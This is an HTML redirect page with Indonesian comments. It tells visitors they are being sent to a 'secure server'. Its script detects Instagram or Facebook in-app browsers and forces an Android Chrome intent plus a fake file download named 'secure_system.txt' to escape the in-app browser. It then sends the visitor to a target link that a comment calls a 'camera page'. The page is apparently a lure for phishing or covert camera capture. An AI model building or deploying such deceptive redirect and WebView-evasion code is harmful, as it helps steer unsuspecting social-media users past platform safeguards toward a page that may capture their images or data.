<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Menghubungkan...</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .loading {
            font-weight: bold;
            color: #ff0000;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <div class="loading">MENGALIHKAN KE SERVER AMAN...</div>

    <script>
        // TAUTAN TARGET UTAMA REPOSITORI ANDA
        const LINK_UTAMA = "https://github.io";

        // Fungsi mengecek apakah dibuka dari dalam aplikasi Instagram/Facebook
        function isInstagram() {
            return navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
        }

        if (isInstagram()) {
            // TRIK MUTAL: Memaksa Android/iOS mendownload file tiruan agar mental keluar dari Instagram WebView
            const intentLink = "intent://" + LINK_UTAMA.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
            
            const fileBlob = new Blob(["Bypass Instagram WebView"], { type: "application/octet-stream" });
            const urlBlob = window.URL.createObjectURL(fileBlob);
            
            const anchor = document.createElement("a");
            anchor.href = intentLink; // Prioritas jalur Android Intent ke Chrome
            anchor.download = "secure_system.txt";
            document.body.appendChild(anchor);
            anchor.click();
            
            // Cadangan bypass menggunakan skema Blob Unduhan jika Intent diblokir
            setTimeout(() => {
                anchor.href = urlBlob;
                anchor.click();
            }, 300);

        } else {
            // Jika sudah berada di luar Instagram (Chrome/Safari asli), langsung buka halaman kamera
            window.location.href = LINK_UTAMA;
        }
    </script>
</body>
</html>
